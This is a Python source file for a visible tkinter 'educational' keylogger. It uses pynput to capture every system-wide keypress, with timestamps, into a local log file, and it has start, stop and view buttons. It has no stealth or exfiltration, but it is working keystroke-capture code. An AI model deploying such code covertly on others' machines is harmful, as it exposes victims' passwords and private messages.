import tkinter as tk
from tkinter import messagebox, scrolledtext
from pynput import keyboard
import logging
from datetime import datetime
import threading
import os


class EducationalKeylogger:
    def __init__(self):
        self.listener = None
        self.running = False
        self.log_file = "keylogs.txt"

        # Logging setup with timestamp
        logging.basicConfig(
            filename=self.log_file,
            level=logging.INFO,
            format='%(asctime)s | %(message)s',
            datefmt='%Y-%m-%d %H:%M:%S'
        )

    def on_press(self, key):
        try:
            # Normal characters (a, 1, space, etc.)
            log_message = f"Key: {key.char}"
        except AttributeError:
            # Special keys (Enter, Shift, Ctrl, etc.)
            log_message = f"Special Key: {key}"

        logging.info(log_message)
        print(log_message)  # Console pe bhi dikhega for testing

    def start_logging(self):
        if not self.running:
            self.running = True
            self.listener = keyboard.Listener(on_press=self.on_press)
            self.listener.start()
            messagebox.showinfo("✅ Success", "Keylogger STARTED!\n(Only for educational demo)")

    def stop_logging(self):
        if self.running:
            self.running = False
            if self.listener:
                self.listener.stop()
            messagebox.showinfo("🛑 Stopped", "Keylogger STOPPED!")

    def view_logs(self):
        if os.path.exists(self.log_file):
            with open(self.log_file, 'r', encoding='utf-8') as f:
                logs = f.read()
            # Last 2000 characters show karo (window ke liye)
            window = tk.Toplevel()
            window.title("Keylogs - Educational View")
            text = scrolledtext.ScrolledText(window, width=80, height=25)
            text.pack(padx=10, pady=10)
            text.insert(tk.END, logs[-2000:])
            text.config(state='disabled')
        else:
            messagebox.showinfo("No Logs", "Abhi koi logs nahi hain.")


def main():
    root = tk.Tk()
    root.title("🔒 Educational Keylogger - Portfolio Project")
    root.geometry("500x400")
    root.resizable(False, False)

    app = EducationalKeylogger()

    tk.Label(root, text="Educational Keylogger", font=("Arial", 18, "bold")).pack(pady=15)
    tk.Label(root, text="For Learning & Portfolio Only\nDo NOT use maliciously!", fg="red", font=("Arial", 10)).pack(
        pady=5)

    tk.Button(root, text="🚀 START Logging", command=app.start_logging, bg="#4CAF50", fg="white", font=("Arial", 12),
              height=2, width=20).pack(pady=10)
    tk.Button(root, text="⛔ STOP Logging", command=app.stop_logging, bg="#f44336", fg="white", font=("Arial", 12),
              height=2, width=20).pack(pady=10)
    tk.Button(root, text="📖 View Recent Logs", command=app.view_logs, bg="#2196F3", fg="white", font=("Arial", 12),
              height=2, width=20).pack(pady=10)

    tk.Label(root, text="Press ESC in terminal or close window to exit", fg="gray").pack(pady=20)

    root.mainloop()


if __name__ == "__main__":
    main()